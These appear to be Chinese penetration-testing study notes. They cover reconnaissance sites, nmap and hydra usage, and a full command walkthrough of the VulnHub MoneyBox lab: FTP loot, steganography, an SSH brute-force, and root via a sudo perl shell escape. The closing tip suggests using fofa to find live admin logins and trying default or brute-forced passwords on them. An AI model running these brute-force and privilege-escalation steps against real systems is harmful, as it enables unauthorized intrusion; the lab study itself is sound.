---
title:  信息收集
---

# 信息收集

​      December 29, 2023            9110    

### web打点

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)web打点

#### 查子域名

域名信息查询 - 腾讯云(tencent.com)
域名Whois查询-站长之家(chinaz.com)

Free Whois Lookup  Whois IP Search & Whois Domain Lookup |Whois.com

https://fofa.info/toLogin

https://quake.360.net/quake/#/index

https://hunter.qianxin.com/

https://www.zoomeye.org/business

https://www.shodan.io/

https://search.censys.io/

#### 查ip

kali执行命令：

dig qq.com

nslookup qq.com

### fiddler

下载：[http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/fiddler%E4%B8%AD%E6%96%87%E7%89%88.zip](http://192.168.2.6:5244/d/网盘/百度网盘/软件大全/渗透工具/fiddler中文版.zip)

设置：https://mp.weixin.qq.com/s?__biz=MzU2NDM2OTQxMw==&mid=2247484054&idx=1&sn=3440b36b071491a9b7a03e1e293aab57&chksm=fc4d43fccb3acaea94fd6073cba7f68efad9ba21177694ec7599d99cb7330ffa7edf01f80002&scene=27

使用：https://blog.csdn.net/Mubei1314/article/details/122389950

### 打靶

dirsearch -u “[http://192.168.2.31](http://192.168.2.31/)“ -x 403,404 

 msfconsole

search drupal

use 2

show options

set rhosts 192.168.2.88

run

shell

python -c “import pty;pty.spawn(‘/bin/bash’)”

find / -user root -perm -4000 -print 2>/dev/null

find / -name cron.php -exec “/bin/sh” ; 

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)打靶3

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)打靶2

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)打靶1

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)打靶

### 搜索规则

百度：要求查找ip地址的信息去除csdn的内容搜索博客园的内容，类似于：ip地址 -CSDN博客 +博客园

谷歌：

双引号包起来会查找连续的内容

加* 通配符-星号，代表完整的字词; A * B、A * * B这两个是有区别的

filetype：pdf  检索pdf文件

联合搜索加空格

inurl：login： 地址栏中包含login

更多语法：https://www.yuque.com/sunwu-pbywz/oc04c5/hinmiv?inner=KdFrB

### 支付漏洞

Business logic vulnerabilities 业务逻辑漏洞

例：[Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)

[High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)

### pikachu打靶

#### 暴力破解

bp抓包选择集束炸弹模式，选择账号与密码两个点$进行。

yakit抓包插入模糊字典

绕过验证码可以使用禁止页面使用js的方式

#### pikachu xss

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)domxss

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)domxss-x

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)盲打

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)过滤

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)htmlspecialchars

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)herf输出

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)js输出

### oracle virtualbox打靶

#### 下载virtualbox

[http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/ensp-3c/ensp3c%E7%89%88%E6%96%B0%E7%89%88%E5%AE%89%E8%A3%85%E5%8C%85/VirtualBox-5.2.28-130011-Win.exe](http://192.168.2.6:5244/d/网盘/百度网盘/软件大全/ensp-3c/ensp3c版新版安装包/VirtualBox-5.2.28-130011-Win.exe)

#### moneybox.ova

[http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E9%95%9C%E5%83%8F%E5%A4%A7%E5%85%A8/%E9%9D%B6%E6%9C%BA/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%89%93%E9%9D%B6/0.1/moneyBox/MoneyBox.ova](http://192.168.2.6:5244/d/网盘/百度网盘/镜像大全/靶机/一起来打靶/0.1/moneyBox/MoneyBox.ova)

导入ova文件

在网络设置中连接方式改为仅主机，virtualbox host-only ethernet adapter

use设备改为usb1

#### vulnhub-MONEYBOX: 1

开启kali

ifdown eth0

ifup eth0

arp-scan -l -i etho

nmap -p 1-10000 192.168.56.101

nmap -p 21,22,80 192.168.56.101

dirsearch -u “[http://192.168.56.101](http://192.168.56.101/)“ -x 403,404,401(查出blogs目录，查看页面得到S3cr3t-T3xt,跳转至该目录得到密钥)

nmap -p 21,22,80 -sC 192.168.56.101(此处可发现Anonymous账号)（这是一个使用 nmap 工具进行端口扫描和脚本扫描的命令。具体来说，该命令指定了要扫描的端口（21、22和80），并启用了默认的脚本扫描。`nmap` 是一个常用的网络扫描工具，用于发现和识别目标主机上开放的端口和提供的服务。通过指定不同的扫描选项和参数，可以对目标主机进行多种类型的扫描，包括端口扫描、操作系统识别、服务和版本识别等。在你提供的命令中，`-p 21,22,80` 参数指定了要扫描的端口，即 21、22 和 80。`-sC` 参数启用了默认的脚本扫描，这将运行一系列内置的脚本来探测和识别目标主机上的服务。`192.168.56.101` 是目标主机的 IP 地址，这是你要对其进行扫描的目标。）

ftp 192.168.56.101

ls

get trytofind.jpg

exit

ls

strings trytofind.jpg

apt install steghide

steghide extract -sf trytofind.jpg

cat data.txt

hydra -l renu -P /usr/share/wordlists/Passwords/darkweb2017-top10000.txt ssh://192.168.56.101

ssh [renu@192.168.56.101](mailto:renu@192.168.56.101)

ls

cat user1.txt

ls -al

cat .bash_history

ssh [lily@192.168.56.101](mailto:lily@192.168.56.101)

ls -al

cat user2.txt

sudo perl -e ‘exec”/bin/sh”;’

cd /root

ls -al

cat .root.txt

相关操作命令：https://gtfobins.github.io/

靶场参考https://www.yuque.com/g/sunwu-pbywz/baji/un4pf9/collaborator/join?token=qFv08WRcPtc1ivgS&source=doc_collaborator# 

##### 相关知识点：

###### dirsearch

`python3 dirsearch.py -u "https://example.com"`
扫描[https://example.com网站](https://example.com网站/)
`python3 dirsearch.py -e php,html -u "https://example.com"`
指定文件扩展名
`python3 dirsearch.py -e php,html -u "https://example.com" -w /wordlist`
指定字典
`python3 dirsearch.py -e php -u "https://example.com" --prefixes .,admin,_`
指定前缀，为 . admin _
`python3 dirsearch.py -e php,html,txt -u "https://example.com" -t 20`
指定线程数量–20

###### perl提权

通过生成交互式系统 shell 来脱离受限环境。

如果允许二进制文件以超级用户身份运行，则它不会删除提升的权限 `sudo` ，并且可用于访问文件系统、升级或维护特权访问。

- `sudo perl -e 'exec "/bin/sh";' ###### 使用Hydra破解弱密码Hydra，俗称九头蛇，是一款非常强大的暴力破解工具，支持多种服务协议的账号和密码进行爆破，包括Web登录、数据库、SSH、FTP等服务，支持Linux、Windows、Mac平台安装。它是由著名的黑客组织THC开发的一款开源暴力破解、验证性质的工具。目前该工具支持以下协议的爆破：```txtAFP，Cisco  AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-GET，HTTP-FORM-POST，HTTP-GET，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM-  GET，HTTPS-FORM-POST，HTTPS-GET，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，PC-Anywhere，  PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP /  R3，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（v1和v2），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP `

1、常见参数

 Hydra是一个命令行工具，所有的操作都是通过命令和参数实现的，如下就是最常见的Hydra暴力破解的参数：

| 选项               | 说明                                             |
| ------------------ | ------------------------------------------------ |
| -R                 | 继续上一次破解                                   |
| -I                 | 忽略现有还原文件（不等待10秒）                   |
| -s PORT            | 指定默认端口                                     |
| -l LOGIN           | 指定破解登录用户名                               |
| -L FILE            | 使用文件指定多个用户名                           |
| -p PASS            | 指定密码                                         |
| -P FILE            | 指定密码字典                                     |
| -x MIN:MAX:CHARSET | 密码暴力生成                                     |
| -y                 | 禁止在暴力破解中使用符号                         |
| -r                 | 对选项-x使用非随机方法                           |
| -e nsr             | n：空密码试探，s：使用指定用户和密码试探。       |
| -u                 | 循环用户                                         |
| -C FILE            | 冒号分隔用户名密码：“login:pass” 格式            |
| -M FILE            | 要攻击的服务器列表，每行一个条目，’:’指定端口    |
| -o FILE            | 将找到的登录/密码写入文件                        |
| -b FORMAT          | 指定-o输出格式，默认text,可选json, jsonv1        |
| -f / -F            | 找到用户名/密码后中止破解，-f:每个主机，-F：所有 |
| -t TASKS           | 每个主机并行线程数，默认16                       |
| -T TASKS           | 所有并行线程数，默认64                           |
| -w / -W TIME       | 最大等待响应时间                                 |
| -c TIME            | 所有进程每次尝试登录等待时间                     |
| -4 / -6            | IPv4(默认)/IPv6地址                              |
| -v / -V / -d       | 详细日志模式/每次尝试仅显示用户名密码/调试模式   |
| -k                 | 不重做失败的尝试（适用于-M批量扫描）             |
| -q                 | 不要打印错误连接消息                             |
| -U                 | 服务模块详细使用信息                             |

2、案例1-ftp服务账号破解

提前准备一个ftp服务器，以及登录账号和密码（allen、123456），我们可以使用单个用户名破解密码。

aa.txt文件是需要提前准备的常用密码字典，需要包括123456才行。

```
hydra  -l allen -P e:\aa.txt ftp://127.0.0.1
```

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)img

3、案例2-mysql账号破解

提前准备一个mysql服务器，以及登录账号和密码（root、root），我们可以使用单个用户名破解密码。

aa.txt文件是需要提前准备的常用密码字典，需要包括root才行。

-e nsr  :指定可以尝试空密码。

```
hydra -l root -P e:\aa.txt -e nsr 127.0.0.1 mysql 
```

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)img

4、案例3-ssh账号破解

案例中的以阿里云服务器演示，给的指令中的地址和密码需要换成自己的。

```
hydra -l root -p 123456 120.26.12.53 ssh
hydra -l root -p 123456 ssh://120.26.12.53
hydra -l root -P e:\aa.txt -e nsr ssh://120.26.12.53
```

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)img

```
hydra -l root -P e:\aa.txt -e nsr -vV ssh://120.26.12.53
```

-v参数显示详细的暴力破解的过程。

![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)img

5、案例4-HTTP协议中POST请求破解

可以使用hydra通过网站的登录请求（一般是post），来破解账号和密码（案例中的网址和密码需替换）。

基本的命令为：

```
hydra -l <username> -P <wordlist> 10.10.146.53 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### nmap命令的使用

可用于：

检测活在网络上的主机（主机发现）
检测主机上开放的端口（端口发现或枚举）
检测到相应的端口（服务发现）的软件和版本
检测操作系统，硬件地址，以及软件版本
检测脆弱性的漏洞（Nmap的脚本）

可参考：https://www.cnblogs.com/jjj-fly/p/6700118.html

扫描单一的一个主机，命令如下：

```
nmap 192.168.1.2
```

扫描特定主机上的80,21,23端口,命令如下

```
nmap -p80,21,23 192.168.1.1
```

如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。

```
nmap -O -PN 192.168.1.1/24
```

**Tcp SYN Scan (sS)**

这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.

如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root/administrator权限.

**#nmap -sS 192.168.1.1**

**—————————————–**

**Tcp connect() scan(sT)**

如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.

**#nmap -sT 192.168.1.1**

**—————————————–**

**Udp scan(sU)**

顾名思义,这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.

**#nmap -sU 192.168.1.1**

**—————————————–**

**FIN scan (sF)**

有时候Tcp  SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.，FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).

**# nmap -sF 192.168.1.8**

**—————————————–**

**PING Scan (sP)**

PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.

**#nmap -sP 192.168.1.1**

**——————————————-**

**版本检测(sV)**

版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.

**#nmap -sV 192.168.1.1**

**——————————————-**

**Idle scan (sL)**

Idle scan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.

**#nmap -sL 192.168.1.6 192.168.1.1**

```
-iL: 后加主机ip字典 批量扫描
-iR：选择随机目标主机进行扫描（如 -iR 100 扫描全网随机100个主机）
--exclude:白名单 指定不想扫的主机地址
--excludefile： 后加字典 批量指定白名单中的主机
-sL:列出目标 不进行主机发现
-sn:只ping主机 不扫端口
-Pn:扫描前不需要ping命令若防火墙禁止使用ping，可用此扫描
-PO：使用ip协议进行扫描
--dns-servers: 指定nmap的DNS服务器进行解析
--system-dns：指定系统DNS服务器
--traceroute：路由追踪
-sS:发送SYN包扫描目标主机
-sT:全连接扫描，基于三次握手扫描
-sA:ACK扫描 （可判断有无防火墙）
-sU:发送UDP包探测目标主机
-sI:僵尸扫描
--top-ports <number> :扫描开放概率最高的number个端口
--port-ratio <ratio> :扫描指定频率以上的端口  <radio>为频率
-sV： 进行版本探测
--version-intensity <level>: 指定版本侦测强度（0-9）
-O : 进行系统版本扫描
-T<0-5>:设置定时模板（越高越快）一般用4
--host-timeout <time>: 设置主机超时时间
--scan-delay/--max-scan-delay <time>: 调整扫描之间的延迟
--min-rate <number>: 发送数据包每秒不少于 
--max-rate <number>:发送数据包每秒不多于

-D <decoy1,decoy2[,ME],...>:用诱饵掩盖扫描
-S <IP_Address>: 伪造源地址 
-e 指定网卡
--data <hex string>:将自定义负载附加到已发送的数据包（十六进制）
--spoof-mac <mac address/prefix/vendor name>: mac地址/常量/供应商名称>：欺骗您的mac地址 

--open: 仅显示打开（或可能打开）的端口
-v:增加详细等级（使用-vv或更多预期更多的效果）
-V：打印版本号
```

### 小米范

下载web finder 2.9.jar，拖到java8bin目录下

Java8bin目录执行cmd

输入java -jar web_finder_2.9.jar

在fofa中执行搜索，传递IP至小米范执行

### 弱注入

例子：fofa输入title=管理，进行尝试admin用户的登录，密码填admin等简单的默认密码，或进行字典暴力爆破